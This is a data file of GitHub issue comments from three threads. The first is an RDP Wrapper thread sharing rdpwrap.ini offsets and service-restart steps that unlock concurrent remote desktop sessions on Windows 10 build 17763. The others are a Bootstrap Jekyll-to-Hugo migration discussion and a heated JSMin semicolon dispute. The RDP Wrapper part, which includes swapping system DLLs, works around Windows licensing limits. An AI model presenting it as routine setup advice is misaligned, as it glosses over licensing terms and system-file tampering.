rdpwrap/stascorp/611/447068372,"17763-templates.zip Sorry Team - But here my cooking recipee and all the detail incl. the ini for  Win10 OS 1809-17763.194 ( termsrv.dll Version .168) as it was done with the last update by KB44713322. I also verified all snipping data in #601 and #611. The Difference between the data @friend(x64-only in the first post) to mine in the middle for .165 (x64 and x86) is the fact that Robert find a small deviation in one location for the SingleUserOffset.x64 ( for which I found no reason, stay with the logical location as we had since 17763.1  checking done with IDA and several testbeds. ( see also #606 my post with the multiconnection test) The main difference from termsrv.dll.001 ( OS 1809-17763.1/.55/107/134) was to the termsrv.dll.165. This method is straight forward without manually touching a system file  (like Rfxvmt.dll, termsrv.dll ) ( RDP Wrapper 1.6.2 does it for adding the missing rfxvmt.dll (syswow64) - OK!)   c)  Install rdpwrap.ini - ensure to have the latest     (actual 2018-10-10 in Code res\rdpwrap.ini) by installing (save your own edits before) d)  Edit rdpwrap.ini to add the relevant section     for 10.0.17763.168 (acc.to termsrv.dll.168)     (I do higly recommend to have in the end at least the section for     [10.0.0.17763.1] , and [10.0.17763.1-SLinit]     and     [10.0.0.17763.168] , and [10.0.17763.168-SLinit] Do not stumble over System access privileges and/or elevation (admin) if you edit or exchange rdpwrap.ini directly in the ""%program files%\RDP Wrapper"" folder.  I do recommend to do the edit-task with a copy of the rdpwrap.ini from c) in ""a-folder-of-y.choice"" , insert the both data section ([10.0.17763.168], and [10.0.7763.168-SLInit]) in the template shown.  e)  To replace the data      in ""%program files%\RDP Wrapper""      I do recommend to us a small batch file     to  ""stop net termservice"" ,'PAUSE', do the replacing of ""%program files%\RDP Wrapper\rdpwrap.ini"" and the  'CONTINUE' to ""start net termservice"" again. I also do recommend if you not sure enough that the service has stoppen and restarted witout errors Restart your ""magic-machine""      Do not use the ""update.bat"" of RDP Wrapper as it might overwrite your own Rdpwrap.ini just implemented ""new"" version as the rpwrap.ini contains in the [Main] section an ""updated=yyy.mm.dd"" Date to control the  Update function. (!!)  ---- and more details in my zip file - ",False,True,False,rdpwrap/stascorp/611
rdpwrap/stascorp/611/447106991,"I've followed all the instructions given including those from the 17763-templates.zip file given by @friend but I am still unable to get it working. I have gone as far as uninstalling and reinstalling RDP Wrapper and have even replaced the termsrv.dll file in System32 with an older one (10.0.17763.1) to no avail. Curiously enough, now instead of TermService crashing on launch, it is just in a perpetual state of ""Starting."" Seeing other having success makes me think that this is an isolated issue with my computer alone. Are there any other services, programs, permissions, etc that affect the usage of RDP Wrapper? Besides the standard installation and modification of the INI file, is there anything else I should take a look at? ",False,True,False,rdpwrap/stascorp/611
rdpwrap/stascorp/611/447131589,"Hello Kasim Ahmic –  there is normally no need to tackle manually with the termsrv.dll. Did you go straight forward  first with the KB4471332 (10.0.17763.194)  which does an update from termsrv.dll.001  or dll.165 or dll.167  to dll.168 ( …but keeps in case you had been already updated to  .168  ( e.g. done  with the  windows10.0-kb4469342-x64_7290815610ac4c3d657eb5ed6e4e92421fa8c29a.msu  , ""Package_for_RollupFix"" version=""17763.168.1.10"") which leads also to an Termsrv.dll.168  ) The same happens when you update the OS from .168 to .194 (KB4471332) {keeps the termsrv.dll.168) I do assume you are on win 10x64-1809-17763-194 at this time  and you had seen the termsrv.dll.168 and validated the  Version   ( see my crc-listing 3-17763_rdpRule.CRC.txt in the Zip-file) and for now are on termsrv.dll.001 ( manually) As you did so –  I assume you solved the  elevated privileges ( manually or either by a „Tool“). To circumvent the stumbling Stones of the „System“ Access Rights. Did you also Keep an eye on your „Virusscanner“ as some of these “good Boys“ are sensitive and reluctant for exchanging/touching System Files and also registry data. (win-defender is not reluctant). Now It is time  Change the termsrv.dll.001  back to „Normal .168“ Ensure the correctness with following elevated cmd „Certutil -hashfile CWindows\system32\termsrv.dll  -md5“ (-md5 , -sha1 – doesn’t matter in the „3-17763_rdpRule.CRC.txt“  are known crc-data in) You may also verify the property data of CWindows\system32\termsrv.dll   Props 10.10.17763.168  - size 1019392 - date2018-12-04 Another file(s)  of interest is/are CWindows\system32\rfxvmt.dll     Props 10.10.17763.1       - size 40960     - date2018-09-15 CWindows\syswow64\rfxvmt.dll     Props 10.10.17763.1       - size 32768    - date2018-09-15 Remark BUT the syswow64\rfxvmt.dll may be added by your RDP Wrapper V.1.62 with an older date (Up till now this was not conflicting with the RDP wrapper Function,  „one“ rfxvmt.dll (32-bit) should be in this folder.  It must exist only ! If you like you can now take my Template  1-17763_rdpwrap.168.194.txt renaming it to  „%program files%\RDP Wrapper\rdpwrap.ini“  ( this folder is the „Default“ for the first Install.) Follow my short instruction  To replace the data in ""%program files%\RDP Wrapper""  I  recommend to use a batch file    with „Pause“ 1  ""stop net termservice"" ,                'PAUSE',   2  delete old ""%program files%\RDP Wrapper\rdpwrap.ini""  3  and copy the „new-ini-168“ to  ""%program files%\RDP Wrapper\rdpwrap.ini""  4 and then    'CONTINUE' ,  ""start net termservice"" ,     'PAUSE'  again. Keep an eye on the Messages  in the ‚PAUSE‘-Phases ! This should help to ensure that the service has stopped  and restarted without errors Also you may     Restart your ""magic-machine"" before you test the RDP Wrapper with RDPconf.exe and (or)  with  RDPcheck.exe to see the settings and function. This concludes the easy test steps. It should work in General. If there are other termservices products installed , it has Always worked fine. b.r. Hajubu Von Kasim Ahmic Gesendet Donnerstag, 13. Dezember 2018 2119 I've followed all the instructions given including those from the 17763-templates.zip file given by @friend but I am still unable to get it working. I have gone as far as uninstalling and reinstalling RDP Wrapper and have even replaced the termsrv.dll file in System32 with an older one (10.0.17763.1) to no avail. Curiously enough, now instead of TermService crashing on launch, it is just in a perpetual state of ""Starting."" Seeing other having success makes me think that this is an isolated issue with my computer alone. Are there any other services, programs, permissions, etc that affect the usage of RDP Wrapper? Besides the standard installation and modification of the INI file, is there anything else I should take a look at? ",False,True,False,rdpwrap/stascorp/611
rdpwrap/stascorp/611/447327251,"Hey guys, I had the same issue as @friend. Adding both snippets breaks TermService start. What solved it for me is using the full ini file @friend provided in its templates zip. My ini was just the last update from 2018.10.10, but I guess there must have been some differences.  I also tested using the full ini from  and can confirm that it does not work. Thank you @friend ! ",False,True,False,rdpwrap/stascorp/611
rdpwrap/stascorp/611/447327491,I confirm. Works ,False,True,False,rdpwrap/stascorp/611
rdpwrap/stascorp/611/447493388,"Thank you @friend, that worked for me as well! Also, big thanks to @friend and everyone else for the help! I greatly appreciate it! ) ",False,True,False,rdpwrap/stascorp/611
rdpwrap/stascorp/611/447648618,So this is a duplicate of #606 too. ,False,True,False,rdpwrap/stascorp/611
rdpwrap/stascorp/611/447650212,1809-17763.1 -.55  -.107  -.134 has Always had the termsrv.dll.001 version Termsrv.dll with Version  -.165 -.167  -.168 (CU_KB4469342_v5.10)  have different CRC  but same Offset Values – see my template.zip in ^# 611. Therefore Data Sections 10.10.17763  for .1 and  .168  ought to be sufficient in most cases. Cu 4471332 does not touch termsrv.dll.168  only  in cases  less then  .168 ! OK? ^# 606 611 refer to These Facts !  and a little bit also in ^# 601 ( .165) 10.0.17763.194 - CU KB4471332 - keeps/lifts the termsrv.dll to its file version 10.0.17763.168. So this is a duplicate of #606 too. ,False,True,False,rdpwrap/stascorp/611
rdpwrap/stascorp/611/447677531,Thanks very much for posting rdpwrap.ini edit for 17763.168. Works excellent for me. ,False,True,False,rdpwrap/stascorp/611
rdpwrap/stascorp/611/447981976,"@friend Please refrain from mentioning all kinds of codes, details, KB article numbers, as this confuses most people more than it clarifies things. I as a technician find it hard to understand your posts... To be clear to everybody All actions need to be done as administrator. (stop/start the service, edit ini file). First find the version of your termserv.dll file. Just look at termserv.dll. Open Explorer, go to C\Windows\System32, find the file termsrv.dll, rightclick this file and look at the details. This will give you the version number (10.0.17763.xxx) Now add the correct fragments for your version xxx in the rdpwrap.ini and restart the service. BTW a big thank you goes to @friend and @friend for providing the details which need to go into the ini files. This is the real hard work. The correct command to stop the service is net stop termservice (not stop net termservice as is repeated in many posts) the correct command to start the service is net start termservice If you are uncertain about this, use services.msc, then you have a graphical interface. Look for the Remote Desktop Services to stop/start. You can then immediately see if the service is running or not. The order of actions is stop the service, edit the ini file, start the service. NB it would be most welcome to have the rdpwrap.ini file updated at the source more frequently with  validated contents for each new build of termsrv.dll, that would help a lot of people... @friend please?? ",False,True,False,rdpwrap/stascorp/611
rdpwrap/stascorp/611/448028002,"@ andrePKI wrote  Please refrain from mentioning all kinds of codes, details, KB article numbers, as this confuses most people more than it clarifies things. I as a technician find it hard to understand your posts... ➢  „as a technician it is …“  what ever your full background might be, I have also one.  We should stop here and stay cool. ",False,True,False,rdpwrap/stascorp/611
rdpwrap/stascorp/611/448080935,Thank you all !!! works fine with the attached rdpwrap.ini ,False,True,False,rdpwrap/stascorp/611
rdpwrap/stascorp/611/448195270,Windows 10 Pro x86 17763.194 not work with section from .ini for 10.0.17763.168 (the user is not included into system). Windows 10 Pro x64 17763.194 worked. ,False,True,False,rdpwrap/stascorp/611
rdpwrap/stascorp/611/448213818,"@friend wrote X64  Windows 10 Pro x64 17763.194 worked.  … OK  X86 Windows 10 Pro x86 17763.194 not work with section from .ini for 10.0.17763.168 … works in my Testbed VM/Vbox ??  which data sections did you implement ??  17763.1 , 17763-SLinit and also 17763.168, 17763.168-SLInit ?? Which file Version do you see in the properties for the termsrv.dll ?? ",False,True,False,rdpwrap/stascorp/611
rdpwrap/stascorp/611/448232143, I copy section  [10.0.17763.1] -&gt; [10.0.17763.168] and [10.0.17763.1-SLInit] -&gt; [10.0.17763.168-SLInit] ,False,True,False,rdpwrap/stascorp/611
rdpwrap/stascorp/611/448248912,"@friend wrote  1) property Info Termsrv.dll .168 2) I copy section [10.0.17763.1] -&gt; [10.0.17763.168] and [10.0.17763.1-SLInit] -&gt; [10.0.17763.168-SLInit] … Be Aware [10.0.17763.1] is not equal to [10.0.17763.168] Therefore you need both sections, each with seprarate data  Content . … The SLinit Data for [10.0.17763.1-SLInit]  is equal to [10.0.17763.168] Therefore copying is fine … If you wants to have  os(x64 and x86) in one rdpwrap.ini , Combine them in one Header. I add  a small sample to help you to clarify the data sections. rdpwrap-light_for_viaba.txt in rdpwrap-light_for_viaba.zip rdpwrap-light_for_viaba.zip ",False,True,False,rdpwrap/stascorp/611
rdpwrap/stascorp/611/448431137,Which ini file is the right one to grab?  It seems Microsoft have been messing with the file a lot lately? ,False,True,False,rdpwrap/stascorp/611
rdpwrap/stascorp/611/448505777,All works. Thanks. Has attached a file rdpwrap.ini which works on x86 and x64 Windows Pro 10.0.17763.194 version termsrv.dll 10.0.17763.168. rdpwrap.zip ,False,True,False,rdpwrap/stascorp/611
rdpwrap/stascorp/611/448541428,Ok THAT zip file works - thank you! ,False,True,False,rdpwrap/stascorp/611
rdpwrap/stascorp/611/448563603,"One more problem in approximately 20 minutes the session of a remote desktop is disconnected, how it is possible to correct? It will be connected it is possible right after switching-off, in gpedit.msc switching-off time is not set. ",False,True,False,rdpwrap/stascorp/611
rdpwrap/stascorp/611/448566550,"@friend wrote  One more problem in approximately 20 minutes the session of a remote desktop is disconnected, how it is possible to correct? It will be connected it is possible right after switching-off, in gpedit.msc switching-off time is not set. … this seems MS Windows behaviour depending on your „Remote Desktop Session Host“ , which features no given timeout by Default. … found some Infos – BUT Think of RISKs , with Time-Out settings • OPEN A COMMAND-PROMPT AND TYPE GPEDIT.MSC  TO LAUNCH THE LOCAL GROUP POLICY EDITOR SNAP-IN. • IN THE LEFT PANEL, EXPAND THE COMPUTER CONFIGURATION NODE OR THE USER CONFIGURATION NODE, DEPENDING IF YOU WANT TO CHANGE THE RDS BEHAVIOUR ON SYSTEM-SCOPE (RECOMMENDED FOR THIS SCENARIO) OR ON USERS-SCOPE (SEE BELOW FOR THE DIFFERENCES). • NAVIGATE TO ADMINISTRATIVE TEMPLATES &gt; WINDOWS COMPONENTS &gt; REMOTE DESKTOP SERVICES &gt; REMOTE DESKTOP SESSION HOST &gt; SESSION TIME LIMITS. • IN THE RIGHT PANEL, DOUBLE-CLICK THE SET TIME LIMIT FOR ACTIVE BUT IDLE REMOTE DESKTOP SERVICES SESSIONS POLICY IN THE MODAL WINDOW THAT WILL APPEAR, ACTIVATE IT BY SWITCHING THE RADIO BUTTON FROM NOT CONFIGURED TO ENABLED, THEN SET THE DESIRED AMOUNT OF TIME IN THE DROP-DOWN LIST RIGHT BELOW. ",False,True,False,rdpwrap/stascorp/611
rdpwrap/stascorp/611/450316704,"Hi Everyone, I have tried with this .ini file and it worked for me, it's for 10.0.17763.167 version x64 rdpwrap.zip  First, stop the service running CMD as administrator, then run net stop termservice Replace rdpwrap.ini in C\Program Files\RDP Wrapper then run net start termservice Very important Reboot your PC then when your pc rebooted, run RDPConf to check the states, make sure All states are green ",False,True,False,rdpwrap/stascorp/611
bootstrap/twbs/24475/267228250,"OK... this is probably something we might never get to do it due to the amount of changes. That being said, Hugo is blazingly fast and very extensible too. If anyone starts working on it, please let me know. ",False,True,False,bootstrap/twbs/24475
bootstrap/twbs/24475/338290787,Without dependency 😲 love it 👍 ,False,True,False,bootstrap/twbs/24475
bootstrap/twbs/24475/338297385,You know the way straight to my heart 😻 ,False,True,False,bootstrap/twbs/24475
bootstrap/twbs/24475/338701085,I've wanted to ask about using something like Gatsbyjs as an alternative or is that a crazier ask than Hugo? At least it'd be just node dependency instead of using brew to install Hugo. I'd work on something like that. ,False,True,False,bootstrap/twbs/24475
bootstrap/twbs/24475/338705789,"Personally, I'd like to skip using React, Preact et all. Thus my choice is to look into Hugo; no extra client side dependencies, no dependencies to run either. I started working on the Hugo switch, it won't be an easy task, but we'll see how it goes.  if you have any suggestions please don't hesitate to try the branch and provide any patches to help move forward with this. ) So far I face the following issues  We need to have Hugo copy the dist dir without us moving it into the static folder; I made an issue in Hugo discourse and I think I'll ask for such a feature in the GitHub repo I can't seem to be able to make shortcodes or highlight to work in index.html;  need to convert the Jekyll plugins to Hugo shortcodes, but that's after I have something working locally first P  ",False,True,False,bootstrap/twbs/24475
bootstrap/twbs/24475/338813077,"Hello together, The best solution, that was already mentioned in the forum thread, is the ability to specify multiple  dirs. But this is currently not possible. Alternatively, we could make  the new  directory via the  config option. The  directory would remain untouched while other assets from the  folder could be moved into . Are the any naming conflicts or other issues that aren't on my radar? Have a look at my answer in the forum thread. The shown approach works for smaller code examples but it doesn't really scale. Hopefully I or some other community members will come up with a better solution. I have not much experience with Jekyll so please help me to clarify the different terminologies. Are Jekyll's plugins == Hugo's short codes? ",False,True,False,bootstrap/twbs/24475
bootstrap/twbs/24475/338882284,"Hi, @friend, thanks for the reply! That is indeed a valid workaround. It's just that traditionally the dist folder just contained only our dist files and nothing else. I think I will just combine nodemon which we already have. Wouldn't it work if I had a partial with that section and in the partial use ? Or one can't use shortcodes in index.html at all? Not exactly, but Hugo's way of doing things is shortcodes ) Judging by our existent Jekyll plugins, it seems we need the following  bugify.rb just sets the bug URL based on a first parameter. I shouldn't have trouble converting this callout.rb just wraps the inner ""shortcode"" text into  so it shouldn't be hard either example.rb similar to callout, it's a wrapper for highlight, so I shouldn't have a problem either markdown-block.rb this allows us to write markdown code inside HTML code.  So as you can see, it's doable, I just need to have a working directory structure first and I'll get to it. ",False,True,False,bootstrap/twbs/24475
bootstrap/twbs/24475/338940795,"After spending a few more hours on this, I believe it's a deal breaker the fact that we can't use variables in Markdown. And shortcodes is just not the answer to everything. For example, Or I was willing to spend any time needed to make the switch happen,  but this is just not flexible enough. So, at this point I consider the Hugo switch as a no go unfortunately, regardless of how much I wanted this to happen. / ",False,True,False,bootstrap/twbs/24475
bootstrap/twbs/24475/338944829,Why aren't shortcodes a viable option for both cases above? ,False,True,False,bootstrap/twbs/24475
bootstrap/twbs/24475/338951288,Because the above are 2 examples; the docs have hundreds of such cases. And Hugo doesn't throw or anything just silently ignores variables in markdown making things harder to spot... ,False,True,False,bootstrap/twbs/24475
bootstrap/twbs/24475/339023504,"If you had asked me, which you did not, I would have said that ... Why don't you create a `param´ shortcode which fetches a given variable by name and, if not found, exits with -1 and prints ""ERROR Variable ""foo"" in page ""/path/to/page.md"" does not exist"". Which would be pretty great error handling. Oh, and not only can shortcodes have great error handling, they can also be both inline and used as blocks, they can be nested as you please ... But you didn't, and if you want to have that ""half empty"" attitude looking for blockers, that is fine. I thought having Bootstrap run its documentation site on Hugo would be cool for Hugo, and wanted to chime in with some support. But that support voucher requires a slightly different approach to have any longevity. I have edited enough big Hugo docs sites to be pretty certain that it would have been worth it. I'd even be willing to throw away some functionality to get there. But up to you. ",False,True,False,bootstrap/twbs/24475
bootstrap/twbs/24475/339073367,"@friend Hey, no need to be defensive here (or even aggressive for that matter). If you look at my messages above you will see that I created the issue and I expressed how much I want to make the switch. Personally, I don't have anything against either Jekyll nor Hugo; I use both of them, and I even prefer to use Hugo in new projects. That put aside, the issues I face here are not issues that I only face. Having to edit so many markdown files is one thing, having to replace all instances of any custom variables in these files is just insane, at least to me. Searching for  in my branch, I get . So, you see why I say that this problem is a deal-breaker, unfortunately. Oh, and yes, you can expect your end-users to do all these things you mention above, that is fine, I have done it in other personal projects too. But unfortunately, this isn't user-friendly, at all. Now, I don't know the technical details behind this choice; I'm pretty sure there is some reasoning apart from the usual ""content is content and is not supposed to have this"". That being said, I'd be glad to have a look again. Either if we get some help (my branch is here) or if/when things become easier for the end-user. ",False,True,False,bootstrap/twbs/24475
bootstrap/twbs/24475/339158228,"@friend, I agree.  That's a ton of boring work to fix all of those files.  However, I suspect a few sed/perl commands could do most of the work for you.  It looks like you're in Windows, though, so I'd recommend using grepwin.  RegEx FTW!  😄 ",False,True,False,bootstrap/twbs/24475
bootstrap/twbs/24475/339250186,"Yes, @friend is correct about the ""search and replace"" being a good general tool for these migrations. I had a talk with @friend Off Broadway (aka Off GitHub) and concluded that he should provide me with some examples of the core pain points in this migration, and I would create a suggested ""Hugo way"" of doing it. ""If you only have a hammer, you tend to see every problem as a nail"" is a saying that could be applied to this. I don't like that saying. In the enterprise world you may be restricted by politics, but in the open source world, almost any problem can be solved given a solid combination of time+brain. So until the fat lady starts singing the ""This is a Road Blocker!"" song, I suggest we keep a positive look on this. If any of you want to discuss the meta question ""does Hugo support variables in markdown?"", I suggest you open a thread here  answer to the above is ""Yes it does for most practical applications."" Hugo doesn't currently support scripting directly in markdown (indirectly via shortcodes). If that is really needed, maybe we could consider (bold and italic) adding Lua shortcode? As I said, look for solutions, not deal breakers. ",False,True,False,bootstrap/twbs/24475
bootstrap/twbs/24475/339420991,"I've tried to optimize the way code snippets can be handled in templates. For the insertion of variables into the code snippets we could add a template function that takes a string and the current context. The string gets parsed as a template in which the variables () are replaced with the values from the passed context. This could look like this {{ render ""code snippet with variables"" . }}  However, I wasn't able to create multiline strings in Go templates that preserve line breaks, not even with backticks. Hence  can't passed as follows ",False,True,False,bootstrap/twbs/24475
bootstrap/twbs/24475/339639465,"All right, here's what I have so far  I have removed the  shortcode from index.html to make Hugo build, but I need to find a solution for this and bring it back later I have some trouble with our current data files. For example I converted docs-sidebar.html but I end up with no error but empty sidebar here  This has also another issue with  and , see the inline comment I ended up using browsersync and I manually copy the dist folder to the . I tried making the root dir the static dir, but then I couldn't make the ignores to work. So, I think this solution should suffice for now and it actually makes things a little more organized I'm not sure I did it right, probably not, but I had to move the homepage's code in index.html, so I think the layouts I chose are wrong for index.html This doesn't work either  Probably something I missing here too since simple.html, has . And the known issue with variables in markdown files like   I also rebased the branch to keep things clean, but I won't do it from now on so that if anyone wants to contribute something, we don't get any conflicts. Thanks in advance for any help! ",False,True,False,bootstrap/twbs/24475
bootstrap/twbs/24475/339967436,"@friend the issue  should describe a solution to the most critical issues you're facing. For the  folder problem you could first try to create a symbolic link from  to  and see if that could be a workable solution. And if you thought that my earlier comment on this was defensive (""or even aggressive"") that was not my intention, and I also don't read that in my remarks. I just saw this negative approach to this whole thing that I believe would never have moved you anywhere close to the goal line. My intention was to help. So, even after Issue 4011 has been fixed (should not take too long, but I'm in Spain right now, so my focus is elsewhere), you still will have to fix those ""hundreds of files"". It will still, not surprisingly, not be Ruby syntax. This should be fairly straightforward with some regexp replacements, but I see how it could be a problem if you need to do it by hand. So, for me to spend a considerable amount of time on 4011 I need some kind of commitment from both you, @friend and maybe also the people who eventually would be in a position to merge this, that you intend to try to get this working and merged. I understand that there still may be blockers that we don't see, but the ""hundreds of files"" that needs an edit is not in that category. ",False,True,False,bootstrap/twbs/24475
bootstrap/twbs/24475/340163554,"@friend about the dist folder, I just added a step in our scripts which should do the job for now. That being said, I do see something inconsistent between Windows and the Travis builds On my Windows dev VM I get So, I think it's  to blame. After that is fixed I will try moving the config files in root and make use of the  section, which when I last tried it I couldn't make the regexes to work at all. Now, I don't mind replacing many stuff, that is why regex exists. ) What I mind, is if we can use directly variables like we do now. Of course we'll need some shortcodes, I already added a couple to replace the Jekyll plugins. As for going through with this, I don't see any reason not to, as long as we can do things with the same ease like we did with Jekyll regarding the variables and content. Anything else we will face, I'm pretty sure we will be able to find a solution. @friend are you OK with the changes so far? ",False,True,False,bootstrap/twbs/24475
bootstrap/twbs/24475/340187295,"The reason I have not rushed into fixing  is that I'm not really sure the current behaviour is broken. We could probably improve the situation But the gist of it is that you provide the value for .  will never make sense on Linux. If you provide a relative file path, we could fix the slashes -- but you can do that yourself. Or, currently, just use forward slashes, which I think will work on both. That said. I will schedule a ""Hugo 0.31 The Bootstrap Edition"" with the relevant improvements on the first Monday after @friend gives his blessing to this project (i.e. ""if this is doable, let's do it.""). The changes will be in the Hugo master before that, but I like to let it linger for some days before pushing a binary release. ",False,True,False,bootstrap/twbs/24475
bootstrap/twbs/24475/340195745,"@friend forward slashes don't fix the issue, see my last comment on that issue. But the problem I mention above might be something else since it happens on *nix and not on Windows. ",False,True,False,bootstrap/twbs/24475
bootstrap/twbs/24475/340358805,"@friend the only non depency logical lingua franca for  Bootstrap would be JavaScript. The rest is syntatic sugur, personal  preference and taste du jour. ",False,True,False,bootstrap/twbs/24475
bootstrap/twbs/24475/377116038,"@friend based on your comment ( above, can we close this issue? ",False,True,False,bootstrap/twbs/24475
bootstrap/twbs/24475/377130416,"@friend it's still a valid request, although now less possible to happen. ",False,True,False,bootstrap/twbs/24475
bootstrap/twbs/24475/377131616,"A note from me, the main Hugo developer; I have said that I'm willing to address the issues raised above (most notably by adding support for inline shortcodes for all the ad-hoc scripting here), but for me to put down time on that I need some kind of commitment from you that this is something you (i.e. @friend) really want to do. I would recommend doing it. Hugo is very nice to work with for larger documentation sites, and this will be even more obvious if you plan to do translations in the future. ",False,True,False,bootstrap/twbs/24475
bootstrap/twbs/24475/422387835,"I'm gonna take another stab at this, but due to the amount of changes my Hugo branch is basically useless and I'll need to create it from scratch. I'll see when I'll get around to do it. ",False,True,False,bootstrap/twbs/24475
bootstrap/twbs/24475/440241967,I would like to see the docs migrated to Hugo -) I don't know either Jekyll or Hugo but I'll have a look in the following months .. provided that you didn't finish the migration by then ;-) ,False,True,False,bootstrap/twbs/24475
bootstrap/twbs/24475/441211586,"@friend I started making some progress here  notes so far  not being able to use inline code like before becomes easily a problem. I mean, I could add a few shortcodes for the most used stuff, but still it seems there will be cases we'd need this the  addition (since the other time I tried this) is nice for sure. But setting it to  while it copies the dist folder subfolders and files to the publishDir, it doesn't seem to be a way to output the folder to a custom location in the publishDir. Not a big deal if it's not possible, we already have to do this separately. It's just this would get rid of the need to fire up two shells when developing   I really like the  and  shortcodes, and I believe it's the proper way to reference pages and files. But I had trouble using a variable even with  so that we don't hardcode the version. Could be I'm missing something here. Maybe we could extend this or create a new shortcode wrapper to the existent shortcode There are still many things left to fix but the branch at least builds )  Thanks for any help! ",False,True,False,bootstrap/twbs/24475
bootstrap/twbs/24475/441223530," I have said that I would be willing to add ""inline shortcodes"" to Hugo if Bootstrap was moving its docs to Hugo (it would be good PR for us). I understand that you need it, and I guess it would be generally usable -- but for me to put a priority on this and the 20 hours or so it would take me to develop, I would need some kind of commitment from this project (and @friend) that this is something you will try to get done. I understand if there are technical roadblocks that could stop this (doubt it), but the intention should be that this is going to be merged.  ref/relref shortcodes are only very shallow wrappers around . You can easily create your own. See ",False,True,False,bootstrap/twbs/24475
bootstrap/twbs/24475/441238128," It's already been decided internally to move to Hugo by all members. So, it's a matter of how easily we can solve the issues and the switch will happen ASAP ) Thanks! I'd love to be able to use such thing without the extra shortcode, but that'll do, at least for one var in the link.  ",False,True,False,bootstrap/twbs/24475
bootstrap/twbs/24475/441241238,"Note that with what I call ""inline shortcodes"" above, you can pretty much do whatever you want -- but I would still consider it to be cleaner if you created shortcodes (i.e. files) for your ""common stuff"". ",False,True,False,bootstrap/twbs/24475
bootstrap/twbs/24475/441243128,"I agree, but I also need to visualize the transition and make changes along the way ) That being said, do let me know if there are any improvements so that I keep the branch rebased and ready, not like my old one. I have a short TODO ",False,True,False,bootstrap/twbs/24475
bootstrap/twbs/24475/441254665,Also see ,False,True,False,bootstrap/twbs/24475
bootstrap/twbs/24475/442140152,"@friend a quick note I have now merged what I think is the 2 main ""showstoppers"" for you into Hugo master.  will cut a new Hugo release shortly, but it is fairly trivial to build from source (esp. if you use Homebrew on macOS). ",False,True,False,bootstrap/twbs/24475
bootstrap/twbs/24475/442144120,@friend thanks! I got notified already and rebased my hugo-2 branch and I will give this a go when 0.52 is out and see what's left ) ,False,True,False,bootstrap/twbs/24475
bootstrap/twbs/24475/442802070,"@friend I gave it a go in my branch with my hugo-bin fork which is using v0.52.  works pretty good, but I couldn't get  to work with it. That being said, maybe there's a simpler way to reference a page that could accept variables? After this is sorted, I need to figure out how to fix the examples layout, and finally the remaining shortcodes and highlighting styles/ToC. ",False,True,False,bootstrap/twbs/24475
bootstrap/twbs/24475/442806417,"As I said earlier, you would need to create your own ""relref"" to do that. There is  -- but that needs to wait. You should have no problem creating a clean and fast ""Hugo variant"" of this site. Note that the ToC structure is currently a little odd (it is on my short term plan to fix that) -- but I have done similar ""Bootstrap CSS"" ToC styling as you have on your site, so it should be possible. I think you have to be a little pragmatic, and revisit the ""not perfect"" areas later. ",False,True,False,bootstrap/twbs/24475
bootstrap/twbs/24475/442808959,"A tip here Note that you can provide your own implementation of shortcodes with the same name as the built-ins in Hugo, so if you create a  (or ) that takes an optional second argument, so you can do this to get the ""latest version"" And Or something to get another version. Note that I do not know your particular use case, so the above is just some random examples. ",False,True,False,bootstrap/twbs/24475
bootstrap/twbs/24475/442818583,... Or use named params ... or create your own  shortcode ... Main point being Don't underestimate the power and simplicity of shortcodes. ,False,True,False,bootstrap/twbs/24475
bootstrap/twbs/24475/453826189,Sorry I didn't see your note until now (though I did check before the 6th). I'm preparing for travel and have to renege on my offer at least for the time being. This is something I could help with in the future so please feel free to reach out if you get stuck jhabdas@friend.com. ,False,True,False,bootstrap/twbs/24475
bootstrap/twbs/24475/454429814,@friend you can check  and make PRs against that branch. ,False,True,False,bootstrap/twbs/24475
bootstrap/twbs/24475/472525573,"I just merged the PR 🕺 I also made an issue about stuff that we need to look into, any help appreciated ) Huge thanks to @friend for adding functionality that helped us make this happen! ",False,True,False,bootstrap/twbs/24475
bootstrap/twbs/24475/472537456,"This is really, really great! ",False,True,False,bootstrap/twbs/24475
bootstrap/twbs/3057/4106844,bootstrap-dropdown.js when minified with JSMinminify produces error in Firefox error console  saying       clearMenus()needs ; on line   clearMenus()   !isActive &amp;&amp; $parent.toggleClass('open')  if in source  code this is corrected -- no error in minified version ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5135317,nope - that's a bug in jsmin. Probably should let @friend know about it though.  thanks! edit The code had already been changed to an  when i suggested the jsmin issue be filed as a bug. Bootstrap and jsmin play very well together. ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5135512,That is insanely stupid code. I am not going to dumb down JSMin for this case. ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5135562,TC39 is considering the use of ! as an infix operator. This code will break in the future. Fix it now. Learn to use semicolons properly. ! is not intended to be a statement separator. ; is. ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5136362,"i have learned to use them, that's why there isn't one present. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5136392,Zzzzing! ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5136870,"Any language with syntax arguments is clearly broken, compilers deal with this.  Dart, I guess. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5136898,"if you really wanted to get rid of the semicolons (though I really don't see the point of that, is it really that bad that it's worth worrying about it?),  in this context an be replaced with . ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5136922,"coffeescript ftw? otherwise, if you're doing real javascript, do it right? p.s. (I'm not a coffeescripter yet, but it looks more and more like the right tool every day) ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5136945,"Wow. I've read @friend's reasoning for not using semis, but when it comes to actual problems cropping up in the real world, why does ""aesthetic"" preference take precedence? Why write something like just to avoid placing a semi a the end? ♠!` is clearly not meant to do this job. It's a bool operator. Does the fact that the symbol looks prettier really matter? I am well aware that you can hack your way around this and keep saying ""nuh uh!"" instead of admitting that it's ill conceived and improving, but seriously making a snippy response like that just makes you look like an immature hipster smarting off to a battle worn professional. @friend is on the technical committee for fuck's sake. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5136990,"This has nothing to do with being a hipster, and I have no idea why anyone seems to think it does. The simple fact is this code runs on ALL browsers without issue. Regardless if the fact that X version of javascript somewhere in the Y future will stop supporting it (maybe) does NOT give a reason for a javascript minifier to NOT correctly minify it. Also if Crockford thinks this is insanely stupid code and he is on the technical committee then why is this insanely stupid code even possible? ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5136998,I know who @friend is but who is this @friend fellow? ,False,True,False,bootstrap/twbs/3057
